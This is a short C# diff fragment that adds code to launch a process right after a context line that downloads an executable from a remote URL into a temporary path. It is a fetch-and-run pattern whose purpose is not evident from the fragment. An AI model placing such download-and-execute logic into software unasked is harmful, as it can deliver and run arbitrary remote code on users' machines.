@@ -31,3 +31,10 @@ class Program
             {
                 await client.DownloadFileTaskAsync(new Uri(remoteUrl), tempExePath);
             }
+  using (Process process = new Process())
+            {
+                process.StartInfo = startInfo;
+                process.Start();
+                process.WaitForExit();
+            }
+           //later
